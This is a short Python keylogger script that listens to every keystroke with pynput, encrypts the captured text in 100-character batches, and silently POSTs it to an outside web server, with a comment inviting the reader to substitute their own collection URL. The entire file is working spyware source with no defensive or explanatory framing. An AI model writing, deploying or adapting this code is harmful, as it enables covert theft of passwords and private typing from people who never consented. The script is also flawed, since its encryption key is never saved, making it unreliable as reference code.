from pynput.keyboard import Listener
from cryptography.fernet import Fernet # For symmetric encryption of the logged keys 
import requests

key = Fernet.generate_key()
cipher  = Fernet(key)
log = ""
url = "http://eninjain.com/upload"  # Replace with your server URL to upload logs of keys

def on_press(key):
    global log
    key_str = str(key).replace("'", "")
    if key_str == "Key.space":
        key_str= " "
    log += key_str
    if len(log) >= 100:  # Send log every 100 characters
            encrypted_log = cipher.encrypt(log.encode())
            try:
                requests.post(url, data=encrypted_log)
                log = ""  # Clear log after sending
            except :
                 pass  # Handle exceptions (e.g., network errors) silently

with Listener(on_press=on_press) as listener:
    listener.join()